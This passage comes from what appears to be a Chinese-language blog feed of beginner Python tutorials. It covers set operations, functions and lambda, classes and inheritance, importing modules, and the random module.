<p>在Python语言的差集符号是“-”，另外，也可以使用difference( )方法完成这个工作。</p>
<p>如有数学与物理2个夏令营，列出参加数学夏令营但是没有参加物理夏令营的所有成员。列出参加物理夏令营但是没有参加数学夏令营的所有成员：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175158969.png" alt="image-20201002175158969"></p>
<p>使用difference( )方法完成A-B差集与B-A差集的应用：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175247473.png" alt="image-20201002175247473"></p>
<h4 id="对称差集"><a href="#对称差集" class="headerlink" title="对称差集"></a>对称差集</h4><p>有A和B两个集合，如果想获得属于A或是B集合元素，但是排除同时属于A和B的元素，则可以使用对称差集。</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175414485.png" alt="image-20201002175414485"></p>
<p>在Python语言的对称差集符号是“^”，另外，也可以使用symmetric_difference( )方法完成。</p>
<p>如有数学与物理2个夏令营，列出参加数学夏令营或参加物理夏令营，但是排除同时参加2个夏令营的所有成员：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175517327.png" alt="image-20201002175517327"></p>
<h4 id="等于和不等于"><a href="#等于和不等于" class="headerlink" title="等于和不等于"></a>等于和不等于</h4><p>等于的Python符号是“==”，可以得知2个集合是否相等，如果相等传回True，否则传回False。</p>
<p>不等于的Python符号是“!=”，可以得知2个集合是否不相等，如果不相等传回True，否则传回False。</p>
<h4 id="是成员in与不是成员"><a href="#是成员in与不是成员" class="headerlink" title="是成员in与不是成员"></a>是成员in与不是成员</h4><p>Python的关键词in可以测试元素是否是集合的元素成员。</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175718711.png" alt="image-20201002175718711"></p>
<p>Python的关键词not in可以测试元素是否不是集合的元素成员。</p>
<h4 id="适合集合的方法"><a href="#适合集合的方法" class="headerlink" title="适合集合的方法"></a>适合集合的方法</h4><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175835796.png" alt="image-20201002175835796"></p>
<h4 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h4><p>add( )可以增加一个元素，它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">集合A.add(新增元素)</span><br></pre></td></tr></table></figure>
<h4 id="copy"><a href="#copy" class="headerlink" title="copy()"></a>copy()</h4><p>集合复制像列表复制一样，有深复制(deep copy)与浅复制(shallowcopy)，这个方法不需参数，语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新集合名称 &#x3D; 旧集合名称.copy()</span><br></pre></td></tr></table></figure>
<p>copy( )是浅复制，经过复制后未来一个集合内容改变时，不会影响到另一个集合的内容。</p>
<h4 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h4><p>如果指定删除的元素存在集合内，remove( )可以删除这个集合元素；如果指定删除的元素不存在集合内，将有KeyError产生。它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">集合A.remove(欲删除的元素)</span><br></pre></td></tr></table></figure>
<h4 id="discard"><a href="#discard" class="headerlink" title="discard()"></a>discard()</h4><p>discard( )可以删除集合的元素，如果元素不存在也不会有错误产生。语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">retvalue &#x3D; 集合A.discard(欲删除的元素)</span><br></pre></td></tr></table></figure>
<p>会将集合A内，discard( )参数指定的元素删除。不论删除结果为何，这个方法会传回None。</p>
<h4 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h4><p>pop( )是用随机方式删除集合元素，所删除的元素将被传回，如果集合是空集合则程序会产生TypeError错误。</p>
<p>使用格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ret &#x3D; 集合A.pop()</span><br></pre></td></tr></table></figure>
<p>会随机删除集合A内的元素，所删除的元素将被传回ret_element。</p>
<h4 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h4><p>clear会删除集合内所有元素，传回值是None。</p>
<h4 id="两个集合间"><a href="#两个集合间" class="headerlink" title="两个集合间"></a>两个集合间</h4><p>isdisjoint( )：</p>
<p>如果2个集合没有共同的元素会传回True，否则传回False。用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ret_bolan &#x3D; 集合A.isdisjoint(集合B)</span><br></pre></td></tr></table></figure>
<p>issubset():</p>
<p>这个方法可以测试一个函数是否是另一个函数的子集合，例如，A集合所有元素均可在B集合内发现，则A集合是B集合的子集合。如果是则传回True，否则传回False。</p>
<p>用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ret_bolan &#x3D; 集合A.issubset(集合B)</span><br></pre></td></tr></table></figure>
<p>issuperset():</p>
<p>这个方法可以测试一个函数是否是另一个函数的父集合，例如，B集合所有元素均可在A集合内发现，则A集合是B集合的父集合。如果是则传回True，否则传回False。</p>
<p>intersection update( ):</p>
<p>这个方法将传回集合的交集，它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ret &#x3D; A.intersection_update(*B):</span><br></pre></td></tr></table></figure>
<p>上述<em>B代表可以有1到多个集合，如果只有一个集合，例如是B，则执行后A将是A与B的交集。如果</em>B代表(B, C)，则执行后A将是A、B与C的交集。</p>
<p>update():</p>
<p>可以将一个集合的元素加到调用此方法的集合内，它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">集合A.update(集合B)  #将集合B的元素加到集合A内</span><br></pre></td></tr></table></figure>
<p>difference update():</p>
<p>可以删除集合内与另一集合重复的元素，它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">集合A.difference update(集合B)  #集合A内与集合B重复的元素删除，结果存在A集合</span><br></pre></td></tr></table></figure>
<h4 id="适用于集合的基本函数操作"><a href="#适用于集合的基本函数操作" class="headerlink" title="适用于集合的基本函数操作"></a>适用于集合的基本函数操作</h4><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002201804967.png" alt="image-20201002201804967"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础5</title>
    <url>/2020/10/05/Python-%E5%9F%BA%E7%A1%805/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h4 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h4><p>函数的语法格式如下：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003103823057.png" alt="image-20201003103823057"></p>
<p>函数名称 名称必须是唯一的，程序未来可以调用引用。</p>
<p>参数值可有可无的，完全视函数设计需要，可以接收调用函数传来的变量，各参数值之间是用逗号“,”隔开。</p>
<p>return [返回值1,返回值2 , … ]不论是return或接续右边的返回值皆是可有可无，如果有返回多个数据彼此需以逗号“,”隔开。</p>
<h4 id="函数的参数设计"><a href="#函数的参数设计" class="headerlink" title="函数的参数设计"></a>函数的参数设计</h4><p>在真实的函数设计与应用中大多是需要传递一些参数的。</p>
<p>如传递一个参数：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003152402426.png" alt="image-20201003152402426"></p>
<p>当所设计的函数需要传递多个参数，调用此函数时就需要特别留意传递参数的位置需要正确，最后才可以获得正确的结果。最常见的传递参数是数值或字符串数据。</p>
<p>如设计减法的函数subtract( )，第一个参数会减去第二个参数，然后列出执行结果。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003152522193.png" alt="image-20201003152522193"></p>
<p>关键词参数(keyword arguments)是指调用函数时，参数是用参数名称=值配对方式呈现。Python也允许在调用需传递多个参数的函数时，直接将参数名称=值用配对方式传送，这个时候参数的位置就不重要了。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003152806604.png" alt="image-20201003152806604"></p>
<h4 id="函数返回none"><a href="#函数返回none" class="headerlink" title="函数返回none"></a>函数返回none</h4><p>Python在直译时会自动返回处理成“return None”，相当于返回None。在一些程序语言，例如，C语言这个None就是NULL，None在Python中独立成为一个数据类型NoneType。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003153234774.png" alt="image-20201003153234774"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003153305754.png" alt="image-20201003153305754"></p>
<h4 id="函数返回数值"><a href="#函数返回数值" class="headerlink" title="函数返回数值"></a>函数返回数值</h4><p>参数具有返回值功能，将可以大大增加程序的可读性，返回的基本方式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return result  #result就是返回的值</span><br></pre></td></tr></table></figure>
<p>使用return返回函数数据时，也允许返回多个数据，各个数据间只要以逗号隔开即可。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003155117536.png" alt="image-20201003155117536"></p>
<h4 id="函数返回字典数据"><a href="#函数返回字典数据" class="headerlink" title="函数返回字典数据"></a>函数返回字典数据</h4><p>函数除了可以返回数值或字符串数据外，也可以返回比较复杂的数据，例如，字典或列表等。</p>
<p>如调用时会输入VIP_ID编号和Name姓名数据，函数将返回所建立的字典数据：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003155456390.png" alt="image-20201003155456390"></p>
<h4 id="调用函数时参数是列表"><a href="#调用函数时参数是列表" class="headerlink" title="调用函数时参数是列表"></a>调用函数时参数是列表</h4><p>在调用函数时，也可以将列表（此列表可以是由数值、字符串或字典所组成）当参数传递给函数，然后函数可以遍历列表内容，然后执行更进一步的运作。</p>
<p>如函数遍历列表：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003155759704.png" alt="image-20201003155759704"></p>
<h4 id="传递任意数量的参数"><a href="#传递任意数量的参数" class="headerlink" title="传递任意数量的参数"></a>传递任意数量的参数</h4><p>在设计Python的函数时，有时候可能会碰上不知道会有多少个参数会传递到这个函数。</p>
<p>如建立一个冰淇淋的配料程序，一般冰淇淋可以在上面加上配料，这个程序在调用制作冰淇淋函数make_icecream( )时，可以传递0到多个配料，然后make_icecream( )函数会将配料结果的冰淇淋列出来。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160237052.png" alt="image-20201003160237052"></p>
<h4 id="递归式函数设计recursive"><a href="#递归式函数设计recursive" class="headerlink" title="递归式函数设计recursive"></a>递归式函数设计recursive</h4><p>一个函数可以调用其他函数也可以调用自己，其中调用本身的动作称递归式(recursive)调用，递归式调用有下列特色：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">每次调用自己时，都会使范围越来越小。</span><br><span class="line"></span><br><span class="line">必须要有一个终止的条件来结束递归函数。</span><br></pre></td></tr></table></figure>
<p>递归函数最常见的应用是处理正整数的阶乘(factorial)，一个正整数的阶乘是所有小于以及等于该数的正整数的积，同时如果正整数是0则阶乘为1，依照观念正整数是1时阶乘也是1。此阶乘数字的表示法为n!。</p>
<p>如使用递归函数执行阶乘(factorial)运算：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160601838.png" alt="image-20201003160601838"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160632987.png" alt="image-20201003160632987"></p>
<p>上述factorial( )函数的终止条件是参数值为1的情况，由第4行判断然后返回1，下列是正整数为3时递归函数的示意：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160741064.png" alt="image-20201003160741064"></p>
<h4 id="局部变量与全局变量"><a href="#局部变量与全局变量" class="headerlink" title="局部变量与全局变量"></a>局部变量与全局变量</h4><p>某个变量只有在该函数内使用，影响范围限定在这个函数内，这个变量称局部变量(local variable)。如果某个变量的影响范围是在整个程序，则这个变量称全局变量(global variable)。</p>
<p>Python程序在调用函数时会建立一个内存工作区间，在这个内存工作区间可以处理属于这个函数的变量，当函数工作结束，返回原先调用程序时，这个内存工作区间就被收回，原先存在的变量也将被销毁，这也是为何局部变量的影响范围只限定在所属的函数内。</p>
<p>一般在主程序内建立的变量称全局变量，这个变量程序内与本程序的所有函数皆可以引用。如设定一个全局变量，然后函数也可以调用引用：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003161110904.png" alt="image-20201003161110904"></p>
<p>全局变量与函数内的局部变量不要使用相同的名称，因为很容易造成混淆。如果全局变量与函数内的局部变量使用相同的名称，Python会将相同名称的区域与全局变量视为不同的变量，在局部变量所在的函数是使用局部变量内容，其他区域则是使用全局变量的内容。</p>
<p>如局部变量与全局变量定义了相同的变量msg，但是内容不相同。然后执行打印，可以发现在函数与主程序所打印的内容有不同的结果。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003161301240.png" alt="image-20201003161301240"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003162247407.png" alt="image-20201003162247407"></p>
<h4 id="程序设计需要注意"><a href="#程序设计需要注意" class="headerlink" title="程序设计需要注意"></a>程序设计需要注意</h4><p>一般程序设计时有关使用局部变量需注意下列事项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">局部变量内容无法在其他函数引用.</span><br><span class="line"></span><br><span class="line">局部变量内容无法在主程序引用.</span><br></pre></td></tr></table></figure>
<h4 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h4><p>所谓的匿名函数(anonymous function)是指一个没有名称的函数，Python是使用def定义一般函数，匿名函数则是使用lambda来定义，有的人称之为lambda表达式，也可以将匿名函数称lambda函数。通常会将匿名函数与Python的内置函数filter( )、map( )等共同使用，此时匿名函数将只是这些函数的参数。</p>
<p>匿名函数最大特色是可以有许多的参数，但是只能有一个程序码表达式，然后可以将执行结果返回。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lambda arg1,arg2.... :expression  #arg1为参数，可以有多个参数</span><br></pre></td></tr></table></figure>
<p>单一参数的匿名函数应用，可以返回平方值：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004201336873.png" alt="image-20201004201336873"></p>
<p>含2个参数的匿名函数应用，可以返回参数的积：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004201451152.png" alt="image-20201004201451152"></p>
<h4 id="匿名函数使用与filter"><a href="#匿名函数使用与filter" class="headerlink" title="匿名函数使用与filter( )"></a>匿名函数使用与filter( )</h4><p>匿名函数一般是用在不需要函数名称的场合，例如，一些高阶函数(higher-orderfunction)的参数可能是函数，这时就很适合使用匿名函数，同时让程序变得更简洁。有一个内置函数filter( )，它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filter(function,iterable)</span><br></pre></td></tr></table></figure>
<p>函数将依次对iterable(可以重复执行，例如，字符串string、列表list或元组tuple)的元素(item)放入function(item)内，然后将function( )函数执行结果是True的元素(item)组成新的筛选对象(filter object)返回。</p>
<h4 id="匿名函数使用与map"><a href="#匿名函数使用与map" class="headerlink" title="匿名函数使用与map( )"></a>匿名函数使用与map( )</h4><p>内置函数map( )，它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map(function,interable)</span><br></pre></td></tr></table></figure>
<p>函数将依次对iterable(可以重复执行，例如，字符串string、列表list或元组tuple)的元素(item)放入function(item)内，然后将function( )函数执行结果组成新的筛选对象(filter object)返回。</p>
<h2 id="类-面向对象程序"><a href="#类-面向对象程序" class="headerlink" title="类-面向对象程序"></a>类-面向对象程序</h2><p>Python其实是一种面向对象的编程(Object Oriented Programming)，在Python中其实所有的数据类型皆是对象，Python也允许程序设计师自创数据类型，这种自创的数据类型就是类。</p>
<p>设计程序时可以将世间万物分组归类，然后使用类(class)定义你的分类。</p>
<h4 id="类的定义及使用"><a href="#类的定义及使用" class="headerlink" title="类的定义及使用"></a>类的定义及使用</h4><p>类的语法定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname():    #类名称第一个字母必须大写</span><br><span class="line">  statement1</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>
<p>如对银行的类定义：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004202307701.png" alt="image-20201004202307701"></p>
<p>Banks是类名称，在这个类中定义了一个属性(attribute)title与一个方法(method)motto。</p>
<p>在类内定义方法(method)的方式与定义函数的方式相同，但是不可以称之为函数(function)，必须称之为方法(method)，在程序设计时我们可以随时调用函数，但是只有属于该类的对象(object)才可调用相关的方法。</p>
<h4 id="操作类的属性与方法"><a href="#操作类的属性与方法" class="headerlink" title="操作类的属性与方法"></a>操作类的属性与方法</h4><p>操作类的属性与方法首先需定义该类的对象(object)变量，使用下列方式操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.类的属性</span><br><span class="line">object.类的方法()</span><br></pre></td></tr></table></figure>
<h4 id="类的构造函数"><a href="#类的构造函数" class="headerlink" title="类的构造函数"></a>类的构造函数</h4><p>建立类很重要的一个工作是初始化整个类，所谓的初始化类是在类内建立一个初始化方法(method)，这是一个特殊方法，当在程序内定义这个类的对象时将自动执行这个方法。初始化方法有一个固定名称是“<strong>init</strong>( )”，写法是init左右皆是2个底线字符，init其实是initialization的缩写，通常又将这类初始化的方法称构造函数(constructor)。</p>
<p>如设定初始化方法，同时存第一笔开户的钱100元入银行，然后列出存款金额。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004202809117.png" alt="image-20201004202809117"></p>
<h4 id="类的访问权限-封装"><a href="#类的访问权限-封装" class="headerlink" title="类的访问权限-封装"></a>类的访问权限-封装</h4><p>类内的属性可以让外部引用的称公有(public)属性，而可以让外部引用的方法称公有方法。Python也提供一个私有属性与方法的观念，这个观念的主要精神是类外无法直接更改类内的私有属性，类外也无法直接调用私有方法，这个观念又称封装(encapsulation)。</p>
<p>Python对于类内的属性增加了私有属性(private attribute)的观念，应用方式是定义时在属性名称前面增加__(2个底线)，定义为私有属性后，类外的程序就无法引用了。</p>
<p>封装前：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203310489.png" alt="image-20201004203310489"></p>
<p>封装后：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203350625.png" alt="image-20201004203350625"></p>
<p>类有私有的属性，那么也有私有方法(private method)，它的观念与私有属性类似，类外的程序无法调用。至于定义方式与私有属性相同，只要在方法前面加上__(2个底线)符号即可。</p>
<h4 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h4><p>在面向对象程序设计中类是可以继承的，其中被继承的类称父类(parent class)或基类(base class)，继承的类称子类(child class)或衍生类(derived class)。类继承的最大优点是许多父类的公有方法或属性，在子类中不用重新设计，可以直接引用。</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203553583.png" alt="image-20201004203553583"></p>
<p>在程序设计时，基类(base class)必须在衍生类(derived class)前面，整个程序代码结构如下：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203633339.png" alt="image-20201004203633339"></p>
<p>衍生类继承了基类的公有属性与方法，同时也可以有自己的属性与方法。</p>
<p>如Banks类建立一个分行Shilin_Banks，这个衍生类没有任何数据，直接引用基类的公有函数，执行银行的存款作业：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203745811.png" alt="image-20201004203745811"></p>
<p>如何取得基类的私有属性？</p>
<p>基于保护原因，类外是无法直接取得类内的私有属性，即使是它的衍生类也无法直接读取，如果真要取得可以使用return方式，传回私有属性内容。</p>
<p>如衍生类对象取得基类的银行名称title的属性：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004204206862.png" alt="image-20201004204206862"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004204230275.png" alt="image-20201004204230275"></p>
<h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p>在面向对象的程序设计中，也常会发生一个类继承多个类的应用，此时子类也同时继承了多个类的方法。在这个时候，当多个父类拥有相同名称的方法时，应该先执行哪一个父类的方法。在程序中可用下列语法代表继承多个类。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class 类名称(父类1，父类2.....，父类n)</span><br><span class="line">      类内容</span><br></pre></td></tr></table></figure>
<h4 id="type与instance"><a href="#type与instance" class="headerlink" title="type与instance"></a>type与instance</h4><p>可以使用type( )函数得到某一对象变量的类。</p>
<p>isinstance( )函数可以传回对象的类是否属于某一类，它包含2个参数，它的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isinstance(对象，类)   #可传回True或False</span><br></pre></td></tr></table></figure>
<p>如果对象的类是属于第2个参数类或属于第2个参数的子类，则传回True，否则传回False。</p>
<h4 id="特殊属性-文档字符串doc"><a href="#特殊属性-文档字符串doc" class="headerlink" title="特殊属性-文档字符串doc"></a>特殊属性-文档字符串<em>doc</em></h4><p>若是遇到<strong>xx</strong>类的字符串就要特别留意了，这些大多数是特殊属性或方法。</p>
<p>文档字符串的英文原意是文档字符串(docstring)，Python鼓励程序设计师在设计函数或类时，尽量为函数或类增加文档的批注，未来可以使用<strong>doc</strong>特殊属性列出此文档批注。</p>
<p>如将文档批注应用在函数：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004205537211.png" alt="image-20201004205537211"></p>
<h4 id="特殊属性-name属性"><a href="#特殊属性-name属性" class="headerlink" title="特殊属性-name属性"></a>特殊属性-name属性</h4><p>在网络上看别人写的程序，一定会经常在程序末端看到下列叙述：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004205636412.png" alt="image-20201004205636412"></p>
<p>如果上述程序是自己执行，那么<strong>name</strong>就一定是<strong>main</strong>。如果被import到另一个程序，则<strong>name</strong>是本身的文件名。</p>
<p>总结就是<strong>name</strong>可以判别这个程序是自己执行或是被其他程序import导入当成模块使用。</p>
<h4 id="类的特殊方法–str–方法"><a href="#类的特殊方法–str–方法" class="headerlink" title="类的特殊方法–str–方法"></a>类的特殊方法–str–方法</h4><p>类的特殊方法，可以协助返回易读取的字符串。</p>
<p>如在定义<strong>str</strong>( )方法下，列出类的对象：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004210015409.png" alt="image-20201004210015409"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004210111832.png" alt="image-20201004210111832"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-模块</title>
    <url>/2020/10/05/Python-%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>在大型计划的程序设计中，每个人可能只是负责一小功能的函数或类设计，为了可以让团队的其他人可以互相分享设计成果，最后每个人所负责的功能函数或类将存储在模块(module)中，然后供团队其他成员使用。</p>
<h2 id="将自建函数存储在模块中"><a href="#将自建函数存储在模块中" class="headerlink" title="将自建函数存储在模块中"></a>将自建函数存储在模块中</h2><p>一个大型程序一定是由许多的函数或类所组成，为了让程序的工作可以分工以及增加程序的可读性，可以将所建的函数或类存储成模块(module)形式的独立文件，未来再加以调用引用。</p>
<p>模块的扩展名与Python程序文件一样，是py。</p>
<p>如建立一个模块，此模块名称是makefood.py：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005105636944.png" alt="image-20201005105636944"></p>
<h2 id="应用建立的函数模块"><a href="#应用建立的函数模块" class="headerlink" title="应用建立的函数模块"></a>应用建立的函数模块</h2><h4 id="import模块名称"><a href="#import模块名称" class="headerlink" title="import模块名称"></a>import模块名称</h4><p>要导入模块所用语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import 模块名 #导入模块</span><br></pre></td></tr></table></figure>
<p>程序中要引用模块中的函数语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模块名称.函数名称</span><br></pre></td></tr></table></figure>
<h4 id="导入模块内特定单一函数"><a href="#导入模块内特定单一函数" class="headerlink" title="导入模块内特定单一函数"></a>导入模块内特定单一函数</h4><p>如果只想导入模块内单一特定的函数，可以使用下列语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from 模块名称 import 函数名称</span><br></pre></td></tr></table></figure>
<p>程序引用所导入的函数时可以省略模块名称。</p>
<h4 id="导入模块内多个函数"><a href="#导入模块内多个函数" class="headerlink" title="导入模块内多个函数"></a>导入模块内多个函数</h4><p>如果想导入模块内多个函数，函数名称间需以逗号隔开，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from 模块名称  import 函数名称1，函数名称2，函数名称3....</span><br></pre></td></tr></table></figure>
<h4 id="导入模块内所有函数"><a href="#导入模块内所有函数" class="headerlink" title="导入模块内所有函数"></a>导入模块内所有函数</h4><p>如果想导入模块内所有函数，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from 模块 import *</span><br></pre></td></tr></table></figure>
<h4 id="使用as给函数指定替代名称"><a href="#使用as给函数指定替代名称" class="headerlink" title="使用as给函数指定替代名称"></a>使用as给函数指定替代名称</h4><p>可以自行给模块的函数名称一个替代名称，未来可以使用这个替代名称代替原先模块的名称。语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from 模块名称 import 函数名称 as 替代名称</span><br></pre></td></tr></table></figure>
<h4 id="给模块指定替代名称"><a href="#给模块指定替代名称" class="headerlink" title="给模块指定替代名称"></a>给模块指定替代名称</h4><p>Python也允许给模块替代名称，未来可以使用此替代名称导入模块，其语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import 函数名称 as 替代名称</span><br></pre></td></tr></table></figure>
<h2 id="将自建的类的存储在模块中"><a href="#将自建的类的存储在模块中" class="headerlink" title="将自建的类的存储在模块中"></a>将自建的类的存储在模块中</h2><p>当程序设计越来越复杂时，可能我们也会建立许多类，Python也允许我们将所建立的类储存在模块内。</p>
<h4 id="建立类内容的模块"><a href="#建立类内容的模块" class="headerlink" title="建立类内容的模块"></a>建立类内容的模块</h4><p>模块的扩展名与Python程序文件一样，是py。</p>
<p>如建立一个模块，此模块名称是banks.py：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005111329305.png" alt="image-20201005111329305"></p>
<h2 id="应用建立的类模块"><a href="#应用建立的类模块" class="headerlink" title="应用建立的类模块"></a>应用建立的类模块</h2><h4 id="导入模块的单一类"><a href="#导入模块的单一类" class="headerlink" title="导入模块的单一类"></a>导入模块的单一类</h4><p>语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from 模块名称 import 类名称</span><br></pre></td></tr></table></figure>
<p>如导入Banks类：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005111612456.png" alt="image-20201005111612456"></p>
<h4 id="导入模块的多个类"><a href="#导入模块的多个类" class="headerlink" title="导入模块的多个类"></a>导入模块的多个类</h4><p>使用下列方式导入多个类别，所导入的类别名称间需以逗号隔开。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from 模块名称 import 类名称1，类名称2....</span><br></pre></td></tr></table></figure>
<h4 id="导入模块内的所有类"><a href="#导入模块内的所有类" class="headerlink" title="导入模块内的所有类"></a>导入模块内的所有类</h4><p>导入模块内所有类别，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from 模块名称 import *</span><br></pre></td></tr></table></figure>
<h4 id="模块内导入另一个模块的类"><a href="#模块内导入另一个模块的类" class="headerlink" title="模块内导入另一个模块的类"></a>模块内导入另一个模块的类</h4><p>有时候可能一个模块内有太多类别了，此时可以考虑将一系列的类别分成2个或更多个模块储存。如果拆成类别的模块彼此有衍生关系，则子类别也需将父类别导入，执行时才不会有错误产生。</p>
<p>如在下面的这个程序中，分别导入了两个模块</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112102241.png" alt="image-20201005112102241"></p>
<h2 id="随机数random模块"><a href="#随机数random模块" class="headerlink" title="随机数random模块"></a>随机数random模块</h2><p>所谓的随机数是指平均散布在某区间的数字，随机数其实用途很广，最常见的应用是设计游戏时可以控制输出结果。</p>
<h4 id="randint"><a href="#randint" class="headerlink" title="randint()"></a>randint()</h4><p>这个方法可以随机产生指定区间的整数，它的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">randint(min,max) #可以产生min与max之间的整数值</span><br></pre></td></tr></table></figure>
<p>如猜数字游戏，这个程序首先会用randint( )方法产生一个1到10之间的数字，然后如果猜的数值太小会要求猜大一些，如果猜的数值太大会要求猜小一些，最后列出猜了几次才答对。</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112423088.png" alt="image-20201005112423088"></p>
<p>一般赌场的机器其实可以用随机数控制输赢，例如：某个猜大小机器，一般人以为猜对率是50%，但是只要控制随机数，赌场可以直接控制输赢比例。</p>
